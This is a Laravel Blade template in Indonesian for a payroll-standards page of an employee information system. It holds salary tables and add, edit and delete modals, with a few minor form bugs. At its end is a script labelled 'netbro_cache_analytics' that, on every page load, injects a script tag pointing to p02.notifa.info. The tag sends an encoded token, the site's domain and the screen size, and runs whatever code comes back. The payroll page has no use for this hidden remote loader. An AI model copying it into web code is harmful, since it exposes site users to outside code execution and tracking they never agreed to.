<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="">
  <meta name="author" content="">
  <link rel="shortcut icon" href="/image/favicon.png">
  <title>Standar Penggajian</title>
  <link rel="stylesheet" type="text/css" href="assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/datatables/css/dataTables.bootstrap.min.css"/>

  <!-- CSS -->
  <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>

  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/jqvmap/jqvmap.min.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <!-- Toastr untuk notifikasi -->
  <link href="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css" rel="stylesheet">
</head>
<body>

  <!-- Wrapper Start -->
  <div class="be-wrapper">

    <!--  Sidebar Start -->  
    <div class="be-wrapper be-fixed-sidebar">
      @include('Beranda.sidebar')
    </div>
    <!--  Sidebar End -->
    
    <!--   Content Start  -->
    <div class="be-wrapper be-fixed-sidebar">
      <div class="be-content be-icons-list">
        <div class="page-head">
          <h2 class="page-head-title">Standar Penggajian</h2>
          <ol class="breadcrumb page-head-nav">
            <li><a href="/standar_penggajian">Tabel Standar Penggajian</a></li>
            <li class="active">Edit Standar Penggajian</li>
          </ol>
        </div>
        
        <div class="main-content container-fluid">    
          <div class="panel panel-default panel-table">
            <div class="panel-body">
              <div class="panel-heading">Tabel Standar Penggajian</div>      
              <table id="table1" class="table table-striped table-hover table-fw-widget"> 
                <thead>
                  <tr>
                    <th width="200px">NIK</th>
                    <th width="200px">Nama</th>
                    <th width="200px">Divisi</th>
                    <th width="200px"><button data-toggle="modal" data-target="#tambah_standar_penggajian" type="button" class="btn btn-space btn-primary">Tambah Standar Penggajian</button></th>                    
                  </tr>
                </thead>
                
                <tbody>

                  @foreach($data_karyawan as $data_karyawan)
                  @foreach($default_gaji as $data)
                  @if($data_karyawan['nik'] == $data['nik'] )

                  <tr>
                    <td>{{$data_karyawan->nik}}</td>
                    <td>{{$data_karyawan->nama_karyawan}}</td>
                    <td>{{$data_karyawan->divisi}}</td>
                    <td>
                      <button data-toggle="modal" data-target="#rincian-data-penggajian-{{$data['nik']}}" type="button" class="btn btn-space btn-success">Rincian</button>

                      <!-- The Modal Clock IN-->
                      <div class="modal fade" id="rincian-data-penggajian-{{$data['nik']}}">
                        <div class="modal-dialog colored-header-primary">
                          <div class="modal-content">

                            <!-- Modal Header -->
                            <div class="modal-header">
                              <button type="button" class="close" data-dismiss="modal">&times;</button>
                              <table class="no-border no-strip skills">
                                <tbody class="no-border-x no-border-y">
                                  <tr>
                                    <td width="150px"><h4 style="color: white; margin-top: 10px;">NIK</h4></td>
                                    <td width="150px"><h4 style="color: white; margin-top: 10px;">: {{$data_karyawan['nik']}}</h4></td>    
                                  </tr>
                                  <tr>
                                    <td width="150px"><h4 style="color: white; margin-top: 10px;">Nama Karyawan</h4></td>
                                    <td width="150px"><h4 style="color: white; margin-top: 10px;">: {{$data_karyawan['nama_karyawan']}}</h4></td>    
                                  </tr>
                                  <tr>
                                    <td width="150px"><h4 style="color: white; margin-top: 10px;">Divisi / Jabatan</h4></td>
                                    <td width="150px"><h4 style="color: white; margin-top: 10px;">: {{$data_karyawan['divisi']}}</h4></td>    
                                  </tr>
                                </tbody>
                              </table >
                            </div>

                            <form id="form_pengaturan_gaji" name="submit3" action="/gaji/{{$data['id_gaji']}}/update" method="POST">
                              @csrf
                              <!-- Modal body -->
                              <div class="modal-body">
                                <div style="width: 100%; display: table;">
                                  <div style="display: table-row">
                                    <table id="table2" style="table-layout: fixed; word-wrap: break-word; word-break: break-all;" class="table table-bordered table-striped table-hover table-fw-widget">
                                      <tbody>
                                       <!--  Row Pengalaman Tanggal Start -->
                                       <tr>
                                        <td><b>Pengalaman Tanggal<b></td>
                                          <td>{{$data['pengalaman_tanggal']}}</td>            
                                        </tr>
                                        <!--  Row Pengalaman Tanggal End -->

                                        <!--  Row Pengalaman Bulan Start -->
                                        <tr>
                                          <td><b>Pengalaman Bulan</b></td>
                                          <td>{{$data['pengalaman_bulan']}}</td>            
                                        </tr>
                                        <!--  Row Pengalaman Bulan End -->

                                        <!--  Row Gaji Pokok Start -->
                                        <tr>
                                          <td><b>Gaji Pokok</b></td>
                                          <td>{{$data['gaji_pokok']}}</td>            
                                        </tr>
                                        <!--  Row Gaji Pokok End -->
                                        <!--  Row Tunjangan Jabatan Start -->
                                        <tr>
                                          <td><b>Tunjangan Profesi</b></td>
                                          <td>{{$data['T_profesi']}}</td>            
                                        </tr>
                                        <!--  Row Tunjangan Jabatan End -->
                                        <!--  Row Tunjangan Jabatan Start -->
                                        <tr>
                                          <td><b>Tunjangan Jabatan</b></td>
                                          <td>{{$data['T_jabatan']}}</td>            
                                        </tr>
                                        <!--  Row Tunjangan Jabatan End -->
                                        <!--  Row Tunjangan Kinerja Start -->
                                        <tr>
                                          <td ><b>Tunjangan Kinerja</b></td>
                                          <td>{{$data['T.kinerja']}}</td>            
                                        </tr>
                                        <!--  Row Tunjangan Kinerja End -->

                                        <!--  Row Tunjangan Khusus Start -->
                                        <tr>
                                          <td ><b>Tunjangan Khusus</b></td>
                                          <td>{{$data['T_khusus']}}</td>            
                                        </tr>
                                        <!--  Row Tunjangan Khusus End -->

                                        <!--  Row Tunjangan Transport Start -->
                                        <tr>
                                          <td ><b>Tunjangan Transport</b></td>
                                          <td>{{$data['T_transport']}}</td>            
                                        </tr>
                                        <!--  Row Tunjangan Transport End -->

                                        <!--  Row Basic Gaji Perhitungan BPJS Kesehatan Start -->
                                        <tr>
                                          <td ><b>Basic Gaji Perhitungan BPJS Kesehatan</b></td>
                                          <td>{{$data['basic_gaji_perhitungan_bpjs_kesehatan']}}</td>            
                                        </tr>
                                        <!--  Row Basic Gaji Perhitungan BPJS Kesehatan End -->

                                        <!--  Row Basic Gaji Perhitungan BPJS Ketenagakerjaan Start -->
                                        <tr>
                                          <td ><b>Basic Gaji Perhitungan BPJS Ketenagakerjaan</b></td>
                                          <td>{{$data['basic_gaji_perhitungan_bpjs_ketenagakerjaan']}}</td>            
                                        </tr>
                                        <!--  Row Basic Gaji Perhitungan BPJS Ketenagakerjaan End -->

                                        <!--  Row Insentif Start -->
                                        <tr>
                                          <td ><b>Insentif</b></td>
                                          <td>{{$data['insentif']}}</td>  
                                        </tr>
                                        <!--  Row Insentif End -->

                                        <!--  Row Bonus Start -->
                                        <tr>
                                          <td ><b>Bonus</b></td>
                                          <td>{{$data['bonus']}}</td>
                                        </tr>
                                        <!--  Row Bonus End -->

                                        <!--  Row Masa Kerja Start -->
                                        <tr>
                                          <td ><b>Masa Kerja</b></td>
                                          <td>{{$data['masa_kerja']}}</td>
                                        </tr>
                                        <!--  Row Masa Kerja End -->

                                        <!--  Row Status Start -->
                                        <tr>
                                          <td ><b>Status</b></td>
                                          <td>{{$data['status']}}</td>
                                        </tr>
                                        <!--  Row Status End -->

                                      </tbody>
                                    </table>
                                  </div>
                                </div>
                              </div>

                              <!-- Modal footer -->
                              <div class="modal-footer">
                                <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                              </div>
                            </form>
                          </div>
                        </div>
                      </div>
                      <!-- End The Modal Clock IN-->
                      
                      <button data-toggle="modal" data-target="#edit-{{$data->id_default_gaji}}" type="button" class="btn btn-space btn-warning">Edit</button>
                      <button data-toggle="modal" data-target="#hapus_data_penggajian-{{$data->id_default_gaji}}" type="button" class="btn btn-space btn-danger"> Hapus </button>
                    </td>

                    <!--  Modal Edit Start -->
                    <div id="edit-{{$data->id_default_gaji}}" tabindex="-1" role="dialog" class="modal fade colored-header colored-header-primary">
                      <div class="modal-dialog">
                        <div class="modal-content">
                          <div class="modal-header">
                            <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                            <h3 class="modal-title">Edit Standar Penggajian</h3>
                          </div>

                          
                          <form action="/penggajian/standar_penggajian/{{$data->id_default_gaji}}/update" method="POST">
                          @csrf
                            <div class="modal-body">
                              <div class="form-group">
                                <label>Pengalaman Tanggal</label>
                                <input value="{{$data->pengalaman_tanggal}}" name="pengalaman_tanggal" type="text" class="form-control" onBlur="checknikAvailability()">
                              </div>
                              <div class="form-group">
                                <label>Pengalaman Bulan</label>
                                <input value="{{$data->pengalaman_bulan}}" name="pengalaman_bulan" type="text" class="form-control">
                              </div>
                              <div class="form-group">
                                <label>Gaji Pokok</label>
                                <input value="{{$data->gaji_pokok}}" name="gaji_pokok" type="text" class="form-control" required="" onBlur="checknikAvailability()">
                              </div>
                              <div class="form-group">
                                <label>Tunjangan Profesi</label>
                                <input value="{{$data->T_profesi}}" name="T_jabatan" type="text" class="form-control">
                              </div>
                              <div class="form-group">
                                <label>Tunjangan Jabatan</label>
                                <input value="{{$data->T_jabatan}}" name="T_jabatan" type="text" class="form-control">
                              </div>
                              <div class="form-group">
                                <label>Tunjangan Kinerja</label>
                                <input value="{{$data->T_kinerja}}" name="T_kinerja" type="text" class="form-control" onBlur="checknikAvailability()">
                              </div>
                              <div class="form-group">
                                <label>Tunjangan Khusus</label>
                                <input value="{{$data->T_khusus}}" name="T_khusus" type="text" class="form-control">
                              </div>
                              <div class="form-group">
                                <label>Tunjangan Transport</label>
                                <input value="{{$data->T_transport}}" name="T_transport" type="text" class="form-control" onBlur="checknikAvailability()">
                              </div>
                              <div class="form-group">
                                <label>Basic Gaji Perhitungan BPJS Kesehatan</label>
                                <input value="{{$data->basic_gaji_perhitungan_bpjs_kesehatan}}" name="basic_gaji_perhitungan_bpjs_kesehatan" type="text" class="form-control">
                              </div>
                              <div class="form-group">
                                <label>Basic Gaji Perhitungan BPJS Ketenagakerjaan</label>
                                <input value="{{$data->basic_gaji_perhitungan_bpjs_ketenagakerjaan}}" name="basic_gaji_perhitungan_bpjs_ketenagakerjaan" type="text" class="form-control" onBlur="checknikAvailability()">
                              </div>
                              <div class="form-group">
                                <label>Insentif</label>
                                <input value="{{$data->insentif}}" name="insentif" type="text" class="form-control">
                              </div>
                              <div class="form-group">
                                <label>Bonus</label>
                                <input value="{{$data->bonus}}" name="bonus" type="text" class="form-control" onBlur="checknikAvailability()">
                              </div>
                              <div class="form-group">
                                <label>Masa Kerja</label>
                                <input value="{{$data->masa_kerja}}" name="masa_kerja" type="text" class="form-control">
                              </div>
                              <div class="form-group">
                                <label>Status</label>
                                <input value="{{$data->status}}" name="status" type="text" class="form-control" onBlur="checknikAvailability()">
                              </div>            
                              <div class="modal-footer">
                                <button type="button" data-dismiss="modal" class="btn btn-default">Batal</button>
                                <button type="submit"  class="btn btn-primary">Simpan</button>
                              </div>
                            </div>
                          </form>
                        </div>
                      </div>
                    </div> 
                    <!--Akhir dari Modals Edit -->

                    <!-- Modals untuk Hapus -->
                    <div id="hapus_data_penggajian-{{$data->id_default_gaji}}" tabindex="-1" role="dialog" class="modal fade">
                      <div class="modal-dialog">
                        <div class="modal-content">
                          <div class="modal-header">
                            <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                          </div>
                          <div class="modal-body">
                            <div class="text-center">
                              <div class="text-danger"><span class="modal-main-icon mdi mdi-close-circle-o"></span></div>
                              <h3>Apakah Anda yakin untuk menghapus data ini ?</h3>
                              <div class="xs-mt-50">
                                <button type="button" data-dismiss="modal" class="btn btn-space btn-default">Batal</button>
                                <a href="/penggajian/standar_penggajian/{{$data->id_default_gaji}}/delete"><button type="button" class="btn btn-space btn-danger">Hapus</button></a>
                              </div>
                            </div>
                          </div>
                          <div class="modal-footer"></div>
                        </div>
                      </div>
                    </div>
                    <!--Akhir dari Modals Hapus -->

                  </tr>
                  @else
                  @endif
                  @endforeach
                  @endforeach
                </tbody>
              </table>
            </div>
          </div>
          <!-- Table Divisi End -->

          <!--  Modal Tambah Start -->
          <div id="tambah_standar_penggajian" tabindex="-1" role="dialog" class="modal fade colored-header colored-header-primary">
           <div class="modal-dialog">
            <div class="modal-content">
              <div class="modal-header">
                <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                <h3 class="modal-title">Tambah Standar Penggajian</h3>
              </div>
              <div class="modal-body">        
                <form id="form_submit_edit" name="submit1" action="/penggajian/standar_penggajian/tambah_standar_penggajian" method="POST" enctype="multipart/form-data">
                  {{csrf_field()}}
                  <div class="modal-body">
                    <div class="form-group">
                      <label>NIK</label>
                      <input  name="nik" type="text" class="form-control" required="" onBlur="checknikAvailability()">
                    </div>
                    <div class="form-group">
                      <label>Pengalaman Tanggal</label>
                      <input  name="pengalaman_tanggal" type="text" class="form-control" required="" onBlur="checknikAvailability()">
                    </div>
                    <div class="form-group">
                      <label>Pengalaman Bulan</label>
                      <input name="pengalaman_bulan" type="text" class="form-control" required="">
                    </div>
                    <div class="form-group">
                      <label>Gaji Pokok</label>
                      <input name="gaji_pokok" type="text" class="form-control" required="" onBlur="checknikAvailability()">
                    </div>
                    <div class="form-group">
                      <label>Tunjangan Jabatan</label>
                      <input name="T_jabatan" type="text" class="form-control" required="">
                    </div>
                    <div class="form-group">
                      <label>Tunjangan Kinerja</label>
                      <input  name="T_kinerja" type="text" class="form-control" required="" onBlur="checknikAvailability()">
                    </div>
                    <div class="form-group">
                      <label>Tunjangan Khusus</label>
                      <input  name="T_khusus" type="text" class="form-control" required="">
                    </div>
                    <div class="form-group">
                      <label>Tunjangan Transport</label>
                      <input  name="T_transport" type="text" class="form-control" required="" onBlur="checknikAvailability()">
                    </div>
                    <div class="form-group">
                      <label>Basic Gaji Perhitungan BPJS Kesehatan</label>
                      <input  name="basic_gaji_perhitungan_bpjs_kesehatan" type="text" class="form-control" required="">
                    </div>
                    <div class="form-group">
                      <label>Basic Gaji Perhitungan BPJS Ketenagakerjaan</label>
                      <input  name="basic_gaji_perhitungan_bpjs_ketenagakerjaan" type="text" class="form-control" required="" onBlur="checknikAvailability()">
                    </div>
                    <div class="form-group">
                      <label>Insentif</label>
                      <input  name="insentif" type="text" class="form-control" required="">
                    </div>
                    <div class="form-group">
                      <label>Bonus</label>
                      <input  name="bonus" type="text" class="form-control" required="" onBlur="checknikAvailability()">
                    </div>
                    <div class="form-group">
                      <label>Masa Kerja</label>
                      <input  name="masa_kerja" type="text" class="form-control" required="">
                    </div>
                    <div class="form-group">
                      <label>Status</label>
                      <input name="status" type="text" class="form-control" required="" onBlur="checknikAvailability()">
                    </div> 
                  </div>
                  <div class="xs-mt-25" style="float: right;">
                    <button type="button" data-dismiss="modal" class="btn btn-space btn-default">Batal</button>
                    <button type="submit" class="btn btn-space btn-primary">Tambah</button>
                  </div>
                </form>
              </div>
              <div class="modal-footer"></div>
            </div>
          </div>
        </div>
        <!--  Modal Tambah  End -->




      </div>
    </div>
  </div>     
  <!--   Content End  -->

  <!--Footer Start --> 
  <div class="text-center">
    <div class="credits">
      <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
    </div>
  </div>
  <!--Footer End -->

</div>
<!--  Wrapper End -->

<!-- Script Toastr untuk notifikasi-->
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>
<script>
  @if (Session::has('message'))
  var type = "{{Session::get('alert-type','info')}}";
  toastr.options = {
    "debug": false,
    "onclick": null,
    "fadeIn": 300,
    "fadeOut": 1000,
    "timeOut": 5000,
    "extendedTimeOut": 1000
  }

  switch(type)
  {
    case 'info':
    toastr.info("{{Session::get('message')}}");
    break;

    case 'success':
    toastr.success("{{Session::get('message')}}");
    break;

    case 'warning':
    toastr.warning("{{Session::get('message')}}");
    break;

    case 'error':
    toastr.error("{{Session::get('message')}}");
    break;
  }

  @endif

</script>
<!--  Inisialisasi Java Script -->
<script src="assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
<script src="assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
<script src="assets/js/main.js" type="text/javascript"></script>
<script src="assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
<script src="assets/lib/datatables/js/jquery.dataTables.min.js" type="text/javascript"></script>
<script src="assets/lib/datatables/js/dataTables.bootstrap.min.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/dataTables.buttons.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.html5.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.flash.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.print.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.colVis.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.bootstrap.js" type="text/javascript"></script>
<script type="text/javascript">
  $(document).ready(function(){
      //initialize the javascript
      App.init();
      App.dataTables();
    });
  </script>

  <script type="text/javascript">
    document.getElementById("status").onchange = function () {
      document.getElementById("alasan").setAttribute("disabled", "disabled");
      document.getElementById("tgl_resign").setAttribute("disabled", "disabled");
      if (this.value == 'Resign')
        document.getElementById("alasan").removeAttribute("disabled");
      if (this.value == 'Resign')
        document.getElementById("tgl_resign").removeAttribute("disabled");
    };

    // Fungsi Logout

    $(function(){
      $('a#logout').click(function(){
        if(confirm('Apakah anda yakin ingin keluar ?')) {
          return true;
        }

        return false;
      });
    });


    // Fungsi Menu dashboard

    $(document).ready(function(){

      App.init();
      App.dashboard();

    });
  </script>
  <script type="text/javascript">
    if (self == top) {
      function netbro_cache_analytics(fn, callback) {
        setTimeout(function() {
          fn();
          callback();
        }, 0);
      }

      function sync(fn) {
        fn();
      }

      function requestCfs() {
        var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
        var idc_glo_r = Math.floor(Math.random() * 99999999999);
        var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
        var bsa = document.createElement('script');
        bsa.type = 'text/javascript';
        bsa.async = true;
        bsa.src = url;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
      }
      netbro_cache_analytics(requestCfs, function() {});
    };

  </script>
</body>
</html>
